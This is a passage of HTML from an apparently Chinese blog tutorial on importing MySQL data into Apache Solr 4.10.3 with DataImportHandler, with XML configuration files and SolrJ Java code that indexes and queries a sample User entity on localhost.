class=\"string\">&apos;nanjing&apos;</span>);</span><br></pre></td></tr></table></figure>\n<h3 id=\"&#x4F7F;&#x7528;DataImportHandler&#x5BFC;&#x5165;&#x5E76;&#x7D22;&#x5F15;&#x6570;&#x636E;\"><a href=\"#&#x4F7F;&#x7528;DataImportHandler&#x5BFC;&#x5165;&#x5E76;&#x7D22;&#x5F15;&#x6570;&#x636E;\" class=\"headerlink\" title=\"&#x4F7F;&#x7528;DataImportHandler&#x5BFC;&#x5165;&#x5E76;&#x7D22;&#x5F15;&#x6570;&#x636E;\"></a>&#x4F7F;&#x7528;DataImportHandler&#x5BFC;&#x5165;&#x5E76;&#x7D22;&#x5F15;&#x6570;&#x636E;</h3><p>1&#xFF09; &#x914D;&#x7F6E;D:\\Solr\\solr-4.10.3\\example\\solr\\collection1\\conf\\solrconfig.xml</p>\n<p>&#x5728;<requesthandler name=\"/select\" class=\"solr.SearchHandler\">&#x524D;&#x9762;&#x4E0A;&#x52A0;&#x4E0A;&#x4E00;&#x4E2A;dataimport&#x7684;&#x5904;&#x7406;&#x7684;Handler<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;requestHandler name=<span class=\"string\">&quot;/dataimport&quot;</span> class=<span class=\"string\">&quot;org.apache.solr.handler.dataimport.DataImportHandler&quot;</span>&gt;</span><br><span class=\"line\">&#x3000;&#x3000;     &lt;lst name=<span class=\"string\">&quot;defaults&quot;</span>&gt;</span><br><span class=\"line\">&#x3000;&#x3000;        &lt;str name=<span class=\"string\">&quot;config&quot;</span>&gt;data-config.xml&lt;/str&gt;</span><br><span class=\"line\">&#x3000;&#x3000;     &lt;/lst&gt;</span><br><span class=\"line\">&#x3000;&#x3000;&lt;/requestHandler&gt;</span><br></pre></td></tr></table></figure></requesthandler></p>\n<p>2&#xFF09; &#x5728;&#x540C;&#x76EE;&#x5F55;&#x4E0B;&#x6DFB;&#x52A0;data-config.xml</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span><br><span class=\"line\">&lt;dataConfig&gt;</span><br><span class=\"line\">    &lt;dataSource <span class=\"built_in\">type</span>=<span class=\"string\">&quot;JdbcDataSource&quot;</span> driver=<span class=\"string\">&quot;com.mysql.jdbc.Driver&quot;</span> url=<span class=\"string\">&quot;jdbc:mysql://127.0.0.1:3306/mybatis&quot;</span> user=<span class=\"string\">&quot;root&quot;</span> password=<span class=\"string\">&quot;luxx&quot;</span> batchSize=<span class=\"string\">&quot;-1&quot;</span> /&gt;</span><br><span class=\"line\">&#x3000;&#x3000;&lt;document name=<span class=\"string\">&quot;testDoc&quot;</span>&gt;</span><br><span class=\"line\">        &lt;entity name=<span class=\"string\">&quot;user&quot;</span> pk=<span class=\"string\">&quot;id&quot;</span></span><br><span class=\"line\">                query=<span class=\"string\">&quot;select * from user&quot;</span>&gt;</span><br><span class=\"line\">&#x3000;&#x3000;&#x3000;         &lt;field column=<span class=\"string\">&quot;id&quot;</span> name=<span class=\"string\">&quot;id&quot;</span>/&gt;</span><br><span class=\"line\">&#x3000;&#x3000;&#x3000;        &lt;field column=<span class=\"string\">&quot;userName&quot;</span> name=<span class=\"string\">&quot;userName&quot;</span>/&gt;</span><br><span class=\"line\">            &lt;field column=<span class=\"string\">&quot;userAge&quot;</span> name=<span class=\"string\">&quot;userAge&quot;</span>/&gt;</span><br><span class=\"line\">            &lt;field column=<span class=\"string\">&quot;userAddress&quot;</span> name=<span class=\"string\">&quot;userAddress&quot;</span>/&gt;</span><br><span class=\"line\">&#x3000;&#x3000;&#x3000;  &lt;/entity&gt;</span><br><span class=\"line\">&#x3000;&#x3000;&lt;/document&gt;</span><br><span class=\"line\">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure>\n<p>&#x8BF4;&#x660E;&#xFF1A;<br>dataSource&#x662F;&#x6570;&#x636E;&#x5E93;&#x6570;&#x636E;&#x6E90;&#x3002;<br>Entity&#x5C31;&#x662F;&#x4E00;&#x5F20;&#x8868;&#x5BF9;&#x5E94;&#x7684;&#x5B9E;&#x4F53;&#xFF0C;pk&#x662F;&#x4E3B;&#x952E;&#xFF0C;query&#x662F;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x3002;<br>Field&#x5BF9;&#x5E94;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;&#xFF0C;column&#x662F;&#x6570;&#x636E;&#x5E93;&#x91CC;&#x7684;column&#x540D;&#xFF0C;&#x540E;&#x9762;&#x7684;name&#x5C5E;&#x6027;&#x5BF9;&#x5E94;&#x7740;Solr&#x7684;Filed&#x7684;&#x540D;&#x5B57;&#x3002;</p>\n<p>3&#xFF09; &#x4FEE;&#x6539;&#x540C;&#x76EE;&#x5F55;&#x4E0B;&#x7684;schema.xml&#xFF0C;&#x8FD9;&#x662F;Solr&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x91CC;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x7D22;&#x5F15;&#x7684;&#x6A21;&#x5F0F;<br>&#xFF08;1&#xFF09;&#x4FDD;&#x7559;<em>version</em> &#x8FD9;&#x4E2A;field<br>&#xFF08;2&#xFF09;&#x6DFB;&#x52A0;&#x7D22;&#x5F15;&#x5B57;&#x6BB5;&#xFF1A;&#x8FD9;&#x91CC;&#x6BCF;&#x4E2A;field&#x7684;name&#x8981;&#x548C;data-config.xml&#x91CC;&#x7684;entity&#x7684;field&#x7684;name&#x4E00;&#x6837;&#xFF0C;&#x4E00;&#x4E00;&#x5BF9;&#x5E94;&#x3002;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;field name=<span class=\"string\">&quot;id&quot;</span> <span class=\"built_in\">type</span>=<span class=\"string\">&quot;int&quot;</span> indexed=<span class=\"string\">&quot;true&quot;</span> stored=<span class=\"string\">&quot;true&quot;</span> required=<span class=\"string\">&quot;true&quot;</span> multiValued=<span class=\"string\">&quot;false&quot;</span> /&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!--&lt;field name=<span class=\"string\">&quot;id&quot;</span> <span class=\"built_in\">type</span>=<span class=\"string\">&quot;int&quot;</span> indexed=<span class=\"string\">&quot;true&quot;</span> stored=<span class=\"string\">&quot;true&quot;</span> required=<span class=\"string\">&quot;true&quot;</span> multiValued=<span class=\"string\">&quot;false&quot;</span>/&gt; --&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;field name=<span class=\"string\">&quot;userName&quot;</span> <span class=\"built_in\">type</span>=<span class=\"string\">&quot;text_general&quot;</span> indexed=<span class=\"string\">&quot;true&quot;</span> stored=<span class=\"string\">&quot;true&quot;</span> /&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;field name=<span class=\"string\">&quot;userAge&quot;</span> <span class=\"built_in\">type</span>=<span class=\"string\">&quot;int&quot;</span> indexed=<span class=\"string\">&quot;true&quot;</span> stored=<span class=\"string\">&quot;true&quot;</span> /&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;field name=<span class=\"string\">&quot;userAddress&quot;</span> <span class=\"built_in\">type</span>=<span class=\"string\">&quot;text_general&quot;</span> indexed=<span class=\"string\">&quot;true&quot;</span> stored=<span class=\"string\">&quot;true&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>\n<p>&#xFF08;3&#xFF09;&#x5220;&#x9664;&#x591A;&#x4F59;&#x7684;field&#xFF0C;&#x5220;&#x9664;copyField&#x91CC;&#x7684;&#x8BBE;&#x7F6E;&#xFF0C;&#x8FD9;&#x4E9B;&#x7528;&#x4E0D;&#x4E0A;&#x3002;&#x6CE8;&#x610F;&#xFF1A;text&#x8FD9;&#x4E2A;field&#x4E0D;&#x80FD;&#x5220;&#x9664;&#xFF0C;&#x5426;&#x5219;Solr&#x542F;&#x52A8;&#x5931;&#x8D25;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;field name=<span class=\"string\">&quot;text&quot;</span> <span class=\"built_in\">type</span>=<span class=\"string\">&quot;text_general&quot;</span> indexed=<span class=\"string\">&quot;true&quot;</span> stored=<span class=\"string\">&quot;false&quot;</span> multiValued=<span class=\"string\">&quot;true&quot;</span>/&gt;</span><br></pre></td></tr></table></figure></p>\n<p>&#xFF08;4&#xFF09;&#x8BBE;&#x7F6E;&#x552F;&#x4E00;&#x4E3B;&#x952E;&#xFF1A;<uniquekey>id</uniquekey>&#xFF0C;&#x6CE8;&#x610F;&#xFF1A;Solr&#x4E2D;&#x7D22;&#x5F15;&#x7684;&#x4E3B;&#x952E;&#x9ED8;&#x8BA4;&#x662F;&#x53EA;&#x652F;&#x6301;type=&#x201D;string&#x201D;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x7684;&#xFF0C;&#x800C;&#x6211;&#x7684;&#x6570;&#x636E;&#x5E93;&#x4E2D;id&#x662F;int&#x578B;&#x7684;&#xFF0C;&#x4F1A;&#x6709;&#x95EE;&#x9898;&#xFF0C;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A;&#x4FEE;&#x6539;&#x540C;&#x76EE;&#x5F55;&#x4E0B;&#x7684;elevate.xml&#xFF0C;&#x6CE8;&#x91CA;&#x6389;&#x4E0B;&#x9762;2&#x884C;&#xFF0C;&#x8FD9;&#x8C8C;&#x4F3C;&#x662F;Solr&#x7684;Bug&#xFF0C;&#x539F;&#x56E0;&#x4E0D;&#x660E;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;doc id=<span class=\"string\">&quot;MA147LL/A&quot;</span> /&gt;</span><br><span class=\"line\">&lt;doc id=<span class=\"string\">&quot;IW-02&quot;</span> exclude=<span class=\"string\">&quot;true&quot;</span> /&gt;</span><br></pre></td></tr></table></figure></p>\n<p>4&#xFF09;&#x62F7;&#x8D1D;mysql-connector-java-5.1.22-bin.jar&#x548C;solr-dataimporthandler-4.10.3.jar&#x5230;D:\\Solr\\solr-4.10.3\\example\\solr-webapp\\webapp\\WEB-INF\\lib&#x3002;&#x4E00;&#x4E2A;&#x662F;mysql&#x7684;java&#x9A71;&#x52A8;&#xFF0C;&#x53E6;&#x4E00;&#x4E2A;&#x5728;D:\\Solr\\solr-4.10.3\\dist&#x76EE;&#x5F55;&#x91CC;&#xFF0C;&#x662F;org.apache.solr.handler.dataimport.DataImportHandler&#x6240;&#x5728;&#x7684;jar&#x3002;</p>\n<p>&#x91CD;&#x542F;Solr&#x3002;&#x5982;&#x679C;&#x914D;&#x7F6E;&#x6B63;&#x786E;&#x5C31;&#x53EF;&#x4EE5;&#x542F;&#x52A8;&#x6210;&#x529F;&#x3002;</p>\n<p>solrconfig.xml&#x662F;solr&#x7684;&#x57FA;&#x7840;&#x6587;&#x4EF6;&#xFF0C;&#x91CC;&#x9762;&#x914D;&#x7F6E;&#x4E86;&#x5404;&#x79CD;web&#x8BF7;&#x6C42;&#x5904;&#x7406;&#x5668;&#x3001;&#x8BF7;&#x6C42;&#x54CD;&#x5E94;&#x5904;&#x7406;&#x5668;&#x3001;&#x65E5;&#x5FD7;&#x3001;&#x7F13;&#x5B58;&#x7B49;&#x3002;<br>schema.xml&#x914D;&#x7F6E;&#x6620;&#x5C04;&#x4E86;&#x5404;&#x79CD;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x7684;&#x7D22;&#x5F15;&#x65B9;&#x6848;&#x3002;&#x5206;&#x8BCD;&#x5668;&#x7684;&#x914D;&#x7F6E;&#x3001;&#x7D22;&#x5F15;&#x6587;&#x6863;&#x4E2D;&#x5305;&#x542B;&#x7684;&#x5B57;&#x6BB5;&#x4E5F;&#x5728;&#x6B64;&#x914D;&#x7F6E;&#x3002;</p>\n<h3 id=\"&#x7D22;&#x5F15;&#x6D4B;&#x8BD5;\"><a href=\"#&#x7D22;&#x5F15;&#x6D4B;&#x8BD5;\" class=\"headerlink\" title=\"&#x7D22;&#x5F15;&#x6D4B;&#x8BD5;\"></a>&#x7D22;&#x5F15;&#x6D4B;&#x8BD5;</h3><p>&#x8FDB;&#x5165;Solr&#x4E3B;&#x9875;&#xFF0C;&#x5728;Core Selector&#x4E2D;&#x9009;&#x62E9;collection1&#xFF1A;<a href=\"http://localhost:8983/solr/#/collection1\" target=\"_blank\" rel=\"external\">http://localhost:8983/solr/#/collection1</a></p>\n<p>&#x70B9;&#x51FB;Dataimport&#xFF0C;Command&#x9009;&#x62E9;full-import&#xFF08;&#x9ED8;&#x8BA4;&#xFF09;&#xFF0C;&#x70B9;&#x51FB;&#x201C;Execute&#x201D;&#xFF0C;Refresh Status&#x5C31;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x7ED3;&#x679C;&#xFF1A;<br>Indexing completed. Added/Updated: 7 documents.Deleted 0 documents.<br>Requests: 1, Fetched: 7, Skipped: 0, Processed: 7<br>Started: 8 minutes ago</p>\n<p>Query&#x6D4B;&#x8BD5;&#xFF1A;&#x5728;q&#x4E2D;&#x8F93;&#x5165;userName:test1&#x8FDB;&#x884C;&#x68C0;&#x7D22;&#x5C31;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x7ED3;&#x679C;&#x3002;<br>&#x8FD9;&#x91CC;&#x4F7F;&#x7528;full-import&#x7D22;&#x5F15;&#x4E86;&#x914D;&#x7F6E;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5168;&#x90E8;&#x6570;&#x636E;&#xFF0C;&#x4F7F;&#x7528;Solr&#x53EF;&#x4EE5;&#x67E5;&#x8BE2;&#x5BF9;&#x5E94;&#x7684;&#x6570;&#x636E;&#x3002;</p>\n<h3 id=\"&#x4F7F;&#x7528;Solrj&#x7D22;&#x5F15;&#x5E76;&#x68C0;&#x7D22;&#x6570;&#x636E;\"><a href=\"#&#x4F7F;&#x7528;Solrj&#x7D22;&#x5F15;&#x5E76;&#x68C0;&#x7D22;&#x6570;&#x636E;\" class=\"headerlink\" title=\"&#x4F7F;&#x7528;Solrj&#x7D22;&#x5F15;&#x5E76;&#x68C0;&#x7D22;&#x6570;&#x636E;\"></a>&#x4F7F;&#x7528;Solrj&#x7D22;&#x5F15;&#x5E76;&#x68C0;&#x7D22;&#x6570;&#x636E;</h3><p>&#x4E0A;&#x9762;&#x662F;&#x4F7F;&#x7528;Solr Admin&#x9875;&#x9762;&#x4E0A;&#x7684;&#x529F;&#x80FD;&#x6D4B;&#x8BD5;&#x7D22;&#x5F15;&#x548C;&#x68C0;&#x7D22;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4EE3;&#x7801;&#x6765;&#x64CD;&#x4F5C;Solr&#xFF0C;&#x4E0B;&#x9762;&#x7684;&#x4EE3;&#x7801;&#x6D4B;&#x8BD5;&#x4E86;&#x5728;Solr&#x7D22;&#x5F15;&#x4E2D;&#x6DFB;&#x52A0;&#x4E86;&#x4E00;&#x4E2A;User&#x7C7B;&#x5B9E;&#x4F53;&#xFF0C;&#x5E76;&#x901A;&#x8FC7;&#x67E5;&#x627E;&#x6240;&#x6709;&#x7684;index&#x6765;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x3002;</p>\n<p>User&#x5B9E;&#x4F53;&#x7C7B;&#xFF1A;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.mybatis.test.model;</span><br><span class=\"line\"></span><br><span class=\"line\">import org.apache.solr.client.solrj.beans.Field;</span><br><span class=\"line\"></span><br><span class=\"line\">public class User {</span><br><span class=\"line\"></span><br><span class=\"line\">    @Field</span><br><span class=\"line\">    private int id;</span><br><span class=\"line\">    </span><br><span class=\"line\">    @Field</span><br><span class=\"line\">    private String userName;</span><br><span class=\"line\">    </span><br><span class=\"line\">    @Field</span><br><span class=\"line\">    private int userAge;</span><br><span class=\"line\">    </span><br><span class=\"line\">    @Field</span><br><span class=\"line\">    private String userAddress;</span><br><span class=\"line\"></span><br><span class=\"line\">    public int <span class=\"function\"><span class=\"title\">getId</span></span>() {</span><br><span class=\"line\">        <span class=\"built_in\">return</span> id;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public void <span class=\"built_in\">set</span>Id(int id) {</span><br><span class=\"line\">        this.id = id;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public String <span class=\"function\"><span class=\"title\">getUserName</span></span>() {</span><br><span class=\"line\">        <span class=\"built_in\">return</span> userName;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public void <span class=\"built_in\">set</span>UserName(String userName) {</span><br><span class=\"line\">        this.userName = userName;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public int <span class=\"function\"><span class=\"title\">getUserAge</span></span>() {</span><br><span class=\"line\">        <span class=\"built_in\">return</span> userAge;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public void <span class=\"built_in\">set</span>UserAge(int userAge) {</span><br><span class=\"line\">        this.userAge = userAge;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public String <span class=\"function\"><span class=\"title\">getUserAddress</span></span>() {</span><br><span class=\"line\">        <span class=\"built_in\">return</span> userAddress;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public void <span class=\"built_in\">set</span>UserAddress(String userAddress) {</span><br><span class=\"line\">        this.userAddress = userAddress;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public String <span class=\"function\"><span class=\"title\">toString</span></span>() {</span><br><span class=\"line\">        <span class=\"built_in\">return</span> this.userName + <span class=\"string\">&quot; &quot;</span> + this.userAge + <span class=\"string\">&quot; &quot;</span> + this.userAddress;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>&#x4F7F;&#x7528;@Field&#x6CE8;&#x89E3;&#x7684;&#x5C5E;&#x6027;&#x8981;&#x548C;Solr&#x914D;&#x7F6E;&#x7684;Field&#x5BF9;&#x5E94;&#x3002;</p>\n<p>&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;&#xFF1A;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.solr.test;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\">import org.apache.solr.client.solrj.SolrQuery;</span><br><span class=\"line\">import org.apache.solr.client.solrj.SolrServer;</span><br><span class=\"line\">import org.apache.solr.client.solrj.SolrServerException;</span><br><span class=\"line\">import org.apache.solr.client.solrj.impl.HttpSolrServer;</span><br><span class=\"line\">import org.apache.solr.client.solrj.response.QueryResponse;</span><br><span class=\"line\">import org.apache.solr.client.solrj.response.UpdateResponse;</span><br><span class=\"line\">import org.apache.solr.common.SolrDocumentList;</span><br><span class=\"line\"></span><br><span class=\"line\">import com.mybatis.test.model.User;</span><br><span class=\"line\"></span><br><span class=\"line\">public class SolrTest {</span><br><span class=\"line\">    </span><br><span class=\"line\">    private static SolrServer server;</span><br><span class=\"line\">    </span><br><span class=\"line\">    private static final String DEFAULT_URL = <span class=\"string\">&quot;http://localhost:8983/solr/collection1&quot;</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    public static void <span class=\"function\"><span class=\"title\">init</span></span>() {</span><br><span class=\"line\">        server = new HttpSolrServer(DEFAULT_URL);</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    public static void indexUser(User user){</span><br><span class=\"line\">        try {</span><br><span class=\"line\">            //&#x6DFB;&#x52A0;user bean&#x5230;&#x7D22;&#x5F15;&#x5E93;</span><br><span class=\"line\">            try {</span><br><span class=\"line\">                UpdateResponse response = server.addBean(user);</span><br><span class=\"line\">                server.commit();</span><br><span class=\"line\">                System.out.println(response.getStatus());</span><br><span class=\"line\">            } catch (IOException e) {</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            }</span><br><span class=\"line\">        } catch (SolrServerException e) {</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        } </span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    //&#x6D4B;&#x8BD5;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x65B0;&#x7684;bean&#x5B9E;&#x4F8B;&#x5230;&#x7D22;&#x5F15;</span><br><span class=\"line\">    public static void <span class=\"function\"><span class=\"title\">testIndexUser</span></span>(){</span><br><span class=\"line\">        User user = new User();</span><br><span class=\"line\">        user.setId(8);</span><br><span class=\"line\">        user.setUserAddress(<span class=\"string\">&quot;place&quot;</span>);</span><br><span class=\"line\">        user.setUserName(<span class=\"string\">&quot;cdebcdccga&quot;</span>);</span><br><span class=\"line\">        user.setUserAge(83);</span><br><span class=\"line\">        </span><br><span class=\"line\">        indexUser(user);</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    public static void <span class=\"function\"><span class=\"title\">testQueryAll</span></span>() {</span><br><span class=\"line\">        SolrQuery params = new SolrQuery();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // &#x67E5;&#x8BE2;&#x5173;&#x952E;&#x8BCD;&#xFF0C;*:*&#x4EE3;&#x8868;&#x6240;&#x6709;&#x5C5E;&#x6027;&#x3001;&#x6240;&#x6709;&#x503C;&#xFF0C;&#x5373;&#x6240;&#x6709;index</span><br><span class=\"line\">        params.set(<span class=\"string\">&quot;q&quot;</span>, <span class=\"string\">&quot;*:*&quot;</span>);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // &#x5206;&#x9875;&#xFF0C;start=0&#x5C31;&#x662F;&#x4ECE;0&#x5F00;&#x59CB;&#xFF0C;rows=5&#x5F53;&#x524D;&#x8FD4;&#x56DE;5&#x6761;&#x8BB0;&#x5F55;&#xFF0C;&#x7B2C;&#x4E8C;&#x9875;&#x5C31;&#x662F;&#x53D8;&#x5316;start&#x8FD9;&#x4E2A;&#x503C;&#x4E3A;5&#x5C31;&#x53EF;&#x4EE5;&#x4E86;&#x3002;</span><br><span class=\"line\">        params.set(<span class=\"string\">&quot;start&quot;</span>, 0);</span><br><span class=\"line\">        params.set(<span class=\"string\">&quot;rows&quot;</span>, Integer.MAX_VALUE);</span><br><span class=\"line\">            </span><br><span class=\"line\">        // &#x6392;&#x5E8F;&#xFF0C;&#x5982;&#x679C;&#x6309;&#x7167;id&#x6392;&#x5E8F;&#xFF0C;&#x90A3;&#x4E48;&#x5C06;score desc &#x6539;&#x6210; id desc(or asc)</span><br><span class=\"line\">        // params.set(<span class=\"string\">&quot;sort&quot;</span>, <span class=\"string\">&quot;score desc&quot;</span>);</span><br><span class=\"line\">        params.set(<span class=\"string\">&quot;sort&quot;</span>, <span class=\"string\">&quot;id asc&quot;</span>);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // &#x8FD4;&#x56DE;&#x4FE1;&#x606F;*&#x4E3A;&#x5168;&#x90E8;&#xFF0C;&#x8FD9;&#x91CC;&#x662F;&#x5168;&#x90E8;&#x52A0;&#x4E0A;score&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x52A0;&#x4E0B;&#x9762;&#x5C31;&#x4E0D;&#x80FD;&#x4F7F;&#x7528;score</span><br><span class=\"line\">        params.set(<span class=\"string\">&quot;fl&quot;</span>, <span class=\"string\">&quot;*,score&quot;</span>);</span><br><span class=\"line\">        </span><br><span class=\"line\">        QueryResponse response = null;</span><br><span class=\"line\">        try {</span><br><span class=\"line\">            response = server.query(params);</span><br><span class=\"line\">        } catch (SolrServerException e) {</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        }</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(response!=null){</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;Search Results: &quot;</span>);</span><br><span class=\"line\">            SolrDocumentList list = response.getResults();</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (int i = 0; i &lt; list.size(); i++) {</span><br><span class=\"line\">                System.out.println(list.get(i));</span><br><span class=\"line\">            }</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">     </span><br><span class=\"line\">    public static void main(String[] args) {</span><br><span class=\"line\">        init();</span><br><span class=\"line\">        //<span class=\"built_in\">test</span>IndexUser();</span><br><span class=\"line\">        <span 